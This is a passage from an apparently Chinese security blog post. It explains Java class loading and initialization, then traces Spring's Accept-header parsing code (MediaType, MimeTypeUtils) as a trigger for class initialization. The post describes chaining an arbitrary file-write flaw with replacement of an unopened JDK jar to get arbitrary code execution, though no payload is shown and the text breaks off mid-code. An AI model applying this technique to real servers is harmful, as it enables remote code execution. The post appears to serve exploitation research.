<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        System.out.println(<span class="hljs-string">&quot;Before creating MyClass object&quot;</span>);<br><br>        <span class="hljs-comment">// 装载MyClass类</span><br>        <span class="hljs-comment">//Class&lt;?&gt; cls = MyClass.class;</span><br>        Class&lt;?&gt; aClass = Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;com.beigei.fileuploaddemo.test.MyClass&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;After loading MyClass class&quot;</span>);<br><br>        <span class="hljs-comment">// 创建MyClass对象</span><br>        <span class="hljs-comment">//MyClass obj = new MyClass();</span><br>        aClass.newInstance();<br><br>        System.out.println(<span class="hljs-string">&quot;After creating MyClass object&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="/image/image-8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>类加载：classLoader.loadClass(className)</p>
<p>类初始化：classLoader.loadClass(className).newInstance()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        System.out.println(<span class="hljs-string">&quot;Before creating MyClass object&quot;</span>);<br><br>        <span class="hljs-comment">// 装载MyClass类</span><br>        <span class="hljs-comment">//Class&lt;?&gt; cls = MyClass.class;</span><br>        <span class="hljs-comment">//Class&lt;?&gt; aClass = Thread.currentThread().getContextClassLoader().loadClass(&quot;com.beigei.fileuploaddemo.test.MyClass&quot;);</span><br><br>        Class.forName(<span class="hljs-string">&quot;com.beigei.fileuploaddemo.test.MyClass&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;After loading MyClass class&quot;</span>);<br><br>        <span class="hljs-comment">// 创建MyClass对象</span><br>        <span class="hljs-comment">//MyClass obj = new MyClass();</span><br>        <span class="hljs-comment">//aClass.newInstance();</span><br><br>        System.out.println(<span class="hljs-string">&quot;After creating MyClass object&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/image-9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>类加载：Class.forName(className, false, classLoader)</p>
<p>类初始化：Class.forName(className)、Class.forName(className, false, classLoader)</p>
<h3 id="JVM运行中的类加载与类初始化"><a href="#JVM运行中的类加载与类初始化" class="headerlink" title="JVM运行中的类加载与类初始化"></a>JVM运行中的类加载与类初始化</h3><p>运行上述示例代码，加上参数-XX:+TraceClassLoading即可获得加载信息。</p>
<p><img src="/image/image-10.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>可以看到加载了JV为了避免一下加载太多暂时用不到或者以后都用不到的类，只加载了jre&#x2F;lib&#x2F;rt.jar中的很多类，并未加载&#x2F;jre&#x2F;lib中其他类，当需要使用某些类时才会进行加载，存在”懒加载”行为。相关 jar 文件的 Opened 操作没有在一开始就发生，而是调用到相关类时被触发。</p>
<p>结合任意文件上传(写入)漏洞，可通过增加或替换 JDK HOME 目录下的系统 jar 文件，再主动触发 jar 文件里的类初始化来达到执行任意代码的方法。但因JDK 在启动后，不会主动寻找 HOME 目录下新增的 jar 文件去尝试加载，所以只有替换 JDK HOME 目录下原有的 jar 才可行，而且还得寻找系统启动后没有进行过 Opened 操作的系统 jar 文件。</p>
<h3 id="可控的类初始化"><a href="#可控的类初始化" class="headerlink" title="可控的类初始化"></a>可控的类初始化</h3><p>以下情况会触发类的初始化：</p>
<ol>
<li>创建类的实例对象：当通过new关键字创建类的实例对象时，如果该类还没有被初始化，JVM会先触发该类的初始化。</li>
<li>访问类的静态变量或方法：当程序访问类的静态变量或静态方法时，如果该类还没有被初始化，JVM会先触发该类的初始化。</li>
<li>使用反射API访问类：当程序使用反射API访问某个类的时候，如果该类还没有被初始化，JVM会先触发该类的初始化。</li>
<li>初始化子类时：当初始化一个类的子类时，如果该类还没有被初始化，JVM会先触发该类的初始化。</li>
<li>虚拟机启动时：当启动一个Java应用程序时，JVM会先初始化所需的主类，然后通过类的引用链逐一触发其他需要初始化的类的初始化。</li>
</ol>
<p>注:</p>
<p>1、只有在程序访问类的静态变量或静态方法时，类才会被初始化，如果不访问静态变量或静态方法，类不会被初始化。</p>
<p>2、同一个类加载器下，一个类型只会被初始化一 次。</p>
<h4 id="Spring-原生下的可控类初始化"><a href="#Spring-原生下的可控类初始化" class="headerlink" title="Spring 原生下的可控类初始化"></a>Spring 原生下的可控类初始化</h4><p>org.springframework.web.accept.HeaderContentNegotiationStrategy#resolveMediaTypes()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;MediaType&gt; <span class="hljs-title function_">resolveMediaTypes</span><span class="hljs-params">(NativeWebRequest request)</span> <span class="hljs-keyword">throws</span> HttpMediaTypeNotAcceptableException &#123;<br>	<span class="hljs-comment">//从request中获取header头中Accept</span><br>    String[] headerValueArray = request.getHeaderValues(<span class="hljs-string">&quot;Accept&quot;</span>);<br>    <span class="hljs-keyword">if</span> (headerValueArray == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> MEDIA_TYPE_ALL_LIST;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">List</span> <span class="hljs-variable">headerValues</span> <span class="hljs-operator">=</span> Arrays.asList(headerValueArray);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//调用至MediaType#parseMediaType()</span><br>            List&lt;MediaType&gt; mediaTypes = MediaType.parseMediaTypes(headerValues);<br>            MediaType.sortBySpecificityAndQuality(mediaTypes);<br>            <span class="hljs-keyword">return</span> !CollectionUtils.isEmpty(mediaTypes) ? mediaTypes : MEDIA_TYPE_ALL_LIST;<br>        &#125; <span class="hljs-keyword">catch</span> (InvalidMediaTypeException var5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMediaTypeNotAcceptableException</span>(<span class="hljs-string">&quot;Could not parse &#x27;Accept&#x27; header &quot;</span> + headerValues + <span class="hljs-string">&quot;: &quot;</span> + var5.getMessage());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/image-11.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="/image/image-30.png" srcset="/img/loading.gif" lazyload alt="img"><img src="/image/image-31.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>org.springframework.http.MediaType#parseMediaType(@Nullable List<String> mediaTypes)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;MediaType&gt; <span class="hljs-title function_">parseMediaTypes</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> List&lt;String&gt; mediaTypes)</span> &#123;<br>    <span class="hljs-comment">//mediaTypes不为空不进入</span><br>    <span class="hljs-keyword">if</span> (CollectionUtils.isEmpty(mediaTypes)) &#123;<br>        <span class="hljs-keyword">return</span> Collections.emptyList();<br>    <span class="hljs-comment">//mediaTypes.size()为1，进入</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mediaTypes.size() == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">//调用parseMediaType(@Nullable String mediaTypes)</span><br>        <span class="hljs-keyword">return</span> parseMediaTypes((String)mediaTypes.get(<span class="hljs-number">0</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        List&lt;MediaType&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(<span class="hljs-number">8</span>);<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> mediaTypes.iterator();<br><br>        <span class="hljs-keyword">while</span>(var2.hasNext()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">mediaType</span> <span class="hljs-operator">=</span> (String)var2.next();<br>            result.addAll(parseMediaTypes(mediaType));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/image-13.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>org.springframework.http.MediaType#parseMediaType(@Nullable String mediaTypes)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;MediaType&gt; <span class="hljs-title function_">parseMediaTypes</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> String mediaTypes)</span> &#123;<br>    <span class="hljs-comment">//判断mediaTypes是否有值，有值不进入</span><br>    <span class="hljs-keyword">if</span> (!StringUtils.hasLength(mediaTypes)) &#123;<br>        <span class="hljs-keyword">return</span> Collections.emptyList();<br>    <span class="hljs-comment">//进入else    </span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//tokenize()方法将传入字符用&quot;,&quot;分割为一个列表</span><br>        List&lt;String&gt; tokenizedTypes = MimeTypeUtils.tokenize(mediaTypes);<br>        List&lt;MediaType&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(tokenizedTypes.size());<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> tokenizedTypes.iterator();<br>    	<span class="hljs-comment">//遍历列表</span><br>        <span class="hljs-keyword">while</span>(var3.hasNext()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> (String)var3.next();<br>            <span class="hljs-keyword">if</span> (StringUtils.hasText(type)) &#123;<br>                <span class="hljs-comment">//调用至parseMediaType(type)</span><br>                result.add(parseMediaType(type));<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/image-14.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="/image/image-15.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>注：org.springframework.util.MimeTypeUtils#tokenize()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">tokenize</span><span class="hljs-params">(String mimeTypes)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!StringUtils.hasLength(mimeTypes)) &#123;<br>        <span class="hljs-keyword">return</span> Collections.emptyList();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        List&lt;String&gt; tokens = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">inQuotes</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">startIndex</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mimeTypes.length(); ++i) &#123;<br>            <span class="hljs-keyword">switch</span>(mimeTypes.charAt(i)) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                inQuotes = !inQuotes;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;,&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (!inQuotes) &#123;<br>                    tokens.add(mimeTypes.substring(startIndex, i));<br>                    startIndex = i + <span class="hljs-number">1</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\\&#x27;</span>:<br>                ++i;<br>            &#125;<br>        &#125;<br><br>        tokens.add(mimeTypes.substring(startIndex));<br>        <span class="hljs-keyword">return</span> tokens;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>org.springframework.http.MediaType#parseMediaType(String mediaType)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> MediaType <span class="hljs-title function_">parseMediaType</span><span class="hljs-params">(String mediaType)</span> &#123;<br>    MimeType type;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//调用至MimeTypeUtils#parseMimeType()</span><br>        type = MimeTypeUtils.parseMimeType(mediaType);<br>    &#125; <span class="hljs-keyword">catch</span> (InvalidMimeTypeException var4) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidMediaTypeException</span>(var4);<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MediaType</span>(type);<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var3) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidMediaTypeException</span>(mediaType, var3.getMessage());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/image-16.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>org.springframework.util.MimeTypeUtils#parseMimeType(mediaType)</p>
<p>方法中若传入mimeType以multipart开头，调用parseMimeTypeInternal(mimeType)，需调用此方法故重新发送请求</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> MimeType <span class="hljs-title function_">parseMimeType</span><span class="hljs-params">(String mimeType)</span> &#123;<br>	<span class="hljs-comment">//判断mediaTypes是否有值，有值不进入</span><br>    <span class="hljs-keyword">if</span> (!StringUtils.hasLength(mimeType)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidMimeTypeException</span>(mimeType, <span class="hljs-string">&quot;&#x27;mimeType&#x27; must not be empty&quot;</span>);<br>    <span class="hljs-comment">//进入else</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    	<span class="hljs-comment">//若mimeType以multipart开头，调用parseMimeTypeInternal(mimeType)，否则调用cachedMimeTypes.get(mimeType)</span><br>        <span class="hljs-keyword">return</span> mimeType.startsWith(<span class="hljs-string">&quot;multipart&quot;</span>) ? parseMimeTypeInternal(mimeType) : (MimeType)cachedMimeTypes.get(mimeType);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>org.springframework.util.MimeTypeUtils#parseMimeType(mediaType)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> MimeType <span class="hljs-title function_">parseMimeTypeInternal</span><span class="hljs-params">(String mimeType)</span> &#123;<br>	<span class="hljs-comment">//获取到第一个&quot;;&quot;位置</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> mimeType.indexOf(<span class="hljs-number">59</span>);<br>	<span class="hljs-comment">//若有&quot;;&quot;,fullType为截取分号之前的字符串</span><br>	<span class="hljs-comment">//若无分号，则直接截取整个字符串</span><br>	<span class="hljs-comment">//同时，去掉字符串两端的空格</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fullType</span> <span class="hljs-operator">=</span> (index &gt;= <span class="hljs-number">0</span> ? mimeType.substring(<span class="hljs-number">0</span>, index) : mimeType).trim();<br>	<span class="hljs-comment">//fullType为空抛出异常</span><br>    <span class="hljs-keyword">if</span> (fullType.isEmpty()) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidMimeTypeException</span>(mimeType, <span class="hljs-string">&quot;&#x27;mimeType&#x27; must not be empty&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//若fullTyp为 *，则将fullTyp转换成 */*</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;*&quot;</span>.equals(fullType)) &#123;<br>            fullType = <span class="hljs-string">&quot;*/*&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//fullType中第一个&quot;/&quot;分隔符位置</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">subIndex</span> <span class="hljs-operator">=</span> fullType.indexOf(<span class="hljs-number">47</span>);<br>        <span class="hljs-comment">//fullType中不存在&quot;/&quot;分隔符抛出异常</span><br>        <span class="hljs-keyword">if</span> (subIndex == -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidMimeTypeException</span>(mimeType, <span class="hljs-string">&quot;does not contain &#x27;/&#x27;&quot;</span>);<br>        <span class="hljs-comment">// fullType中&quot;/&quot;分隔符为最后一个字符抛出异常</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (subIndex == fullType.length() - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidMimeTypeException</span>(mimeType, <span class="hljs-string">&quot;does not contain subtype after &#x27;/&#x27;&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//type为fullType中第一字符至&quot;/&quot;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> fullType.substring(<span class="hljs-number">0</span>, subIndex);<br>            <span class="hljs-comment">//subtype为fullType中&quot;/&quot;后的字符</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">subtype</span> <span class="hljs-operator">=</span> fullType.substring(subIndex + <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">//type为* subtype不为*报错</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;*&quot;</span>.equals(type) &amp;&amp; !<span class="hljs-string">&quot;*&quot;</span>.equals(subtype)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidMimeTypeException</span>(mimeType, <span class="hljs-string">&quot;wildcard type is legal only in &#x27;*/*&#x27; (all mime types)&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">LinkedHashMap</span> <span class="hljs-variable">parameters</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                <span class="hljs-type">int</span> nextIndex;<br>                <span class="hljs-comment">//do while循环mimeType</span><br>                <span class="hljs-keyword">do</span> &#123;<br>                    nextIndex = index + <span class="hljs-number">1</span>;<br>                	<span class="hljs-comment">//若字符串在&quot;&quot;外且为;则退出循环</span><br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">boolean</span> <span class="hljs-variable">quoted</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>; nextIndex &lt; mimeType.length(); ++nextIndex) &#123;<br>                        <span class="hljs-type">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> mimeType.charAt(nextIndex);<br>                        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;;&#x27;</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (!quoted) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;&quot;&#x27;</span>) &#123;<br>                            quoted = !quoted;<br>                        &#125;<br>                    &#125;<br>                    <br>                	<span class="hljs-comment">//parameter为当前mimeType</span><br>                    <span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> mimeType.substring(index + <span class="hljs-number">1</span>, nextIndex).trim();<br>                    <span class="hljs-keyword">if</span> (parameter.length() &gt; <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (parameters == <span class="hljs-literal">null</span>) &#123;<br>                            parameters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>(<span class="hljs-number">4</span>);<br>                        &#125;<br>                        <span class="hljs-comment">//eqIndex为字符串中第一个=位置</span><br>                        <span class="hljs-type">int</span> <span class="hljs-variable">eqIndex</span> <span class="hljs-operator">=</span> parameter.indexOf(<span class="hljs-number">61</span>);<br>                        <span class="hljs-comment">//字符串中存在=进入</span><br>                        <span class="hljs-keyword">if</span> (eqIndex &gt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-comment">//attribute为parameter中第一个字符串至=</span><br>                            <span class="hljs-type">String</span> <span class="hljs-variable">attribute</span> <span class="hljs-operator">=</span> parameter.substring(<span class="hljs-number">0</span>, eqIndex).trim();<br>                            <span class="hljs-comment">//value为parameter中=后所有字符串</span><br>                            <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parameter.substring(eqIndex + <span class="hljs-number">1</span>).trim();<br>                            parameters.put(attribute, value);<br>                        &#125;<br>                    &#125;<br><br>                    index = nextIndex;<br>                &#125; <span class="hljs-keyword">while</span>(nextIndex &lt; mimeType.length());<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">//调用MimeType构造方法</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MimeType</span>(type, subtype, parameters);<br>                &#125; <span class="hljs-keyword">catch</span> (UnsupportedCharsetException var13) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidMimeTypeException</span>(mimeType, <span class="hljs-string">&quot;unsupported charset &#x27;&quot;</span> + var13.getCharsetName() + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var14) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidMimeTypeException</span>(mimeType, var14.getMessage());<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/image-17.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>org.springframework.util.MimeType构造方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">MimeType</span><span class="hljs-params">(String type, String subtype, <span class="hljs-meta">@Nullable</span> Map&lt;String, String&gt; parameters)</span> &#123;<br>    Assert.hasLength(type, <span class="hljs-string">&quot;&#x27;type&#x27; must not be empty&quot;</span>);<br>    Assert.hasLength(subtype, <span class="hljs-string">&quot;&#x27;subtype&#x27; must not be empty&quot;</span>);<br>    <span class="hljs-built_in">this</span>.checkToken(type);<br>    <span class="hljs-built_in">this</span>.checkToken(subtype);<br>    <span class="hljs-built_in">this</span>.type = type.toLowerCase(Locale.ENGLISH);<br>    <span class="hljs-built_in">this</span>.subtype = subtype.toLowerCase(Locale.ENGLISH);<br>    <span class="hljs-keyword">if</span> (!CollectionUtils.isEmpty(parameters)) &#123;<br>        Map&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedCaseInsensitiveMap</span>(parameters.size(), Locale.ENGLISH);<br>        